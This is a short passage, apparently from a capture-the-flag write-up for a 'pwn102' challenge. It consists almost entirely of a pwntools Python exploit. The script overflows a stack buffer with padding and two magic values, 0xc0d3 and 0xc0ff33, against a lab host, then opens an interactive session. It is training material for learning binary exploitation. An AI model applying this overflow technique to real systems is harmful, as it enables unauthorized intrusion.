Now let's create the exploit

```python3
#!/usr/bin/python3


from pwn import *

context.binary = binary = "./pwn102-1644307392479.pwn102"

#0xc0ff33 0xc0d3

payload = b"A"*0x68 + p32(0xc0d3) + p32(0xc0ff33)

# process
p = remote("10.10.112.167", 9002)
p.recv()
p.sendline(payload)
p.interactive()
```
